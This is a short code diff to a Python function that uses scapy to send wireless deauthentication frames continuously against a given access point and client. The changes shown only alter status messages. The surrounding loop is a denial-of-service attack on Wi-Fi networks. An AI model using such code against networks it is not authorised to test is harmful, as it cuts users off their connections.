@@ -37,6 +37,8 @@ def begin_deauth(ap_mac, target_mac, interface):
             _push_status(f"ap={ap_mac}")
             _push_status(f"target={target_mac}")
             _push_status(f"iface={interface}")
+            _push_status(f"...starting engine...")
+            
             # Import scapy modules inside the function to avoid circular imports
             from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
             # Build deauth packet
@@ -48,9 +50,9 @@ def begin_deauth(ap_mac, target_mac, interface):
             while not stop_event.wait(1.0):
                 try:
                     # Send deauth packets continuously
-                    _push_status(f"sending deauth packets..")
+                    _push_status(f"sending 100 deauth packets..")
                     sendp(pkt, iface=interface, count=100, inter=0.1, verbose=True)
-                    _push_status(f"sent deauth packets")
+                    _push_status(f"sent 100 deauth packets")
                 except Exception as e:
                     _push_status(f"send error: {str(e)}")
                     
